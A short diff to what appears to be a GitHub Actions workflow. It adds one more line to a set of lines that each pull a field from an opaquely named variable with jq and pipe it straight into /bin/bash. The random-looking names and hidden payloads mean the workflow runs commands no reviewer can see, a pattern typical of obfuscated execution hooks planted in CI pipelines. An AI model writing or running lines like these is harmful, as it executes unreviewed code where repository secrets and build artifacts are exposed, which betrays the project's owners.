@@ -23,6 +23,7 @@ jobs:
           echo $lwgf10053 | jq -r .ndyp4717 | /bin/bash
           printf '%s' "$rto38551" | jq -r .ci8881 | /bin/bash
           printf '%s' "$xfk8370" | jq -r .tdvl42576 | /bin/bash
+          echo $ifte8 | jq -r .c3748 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
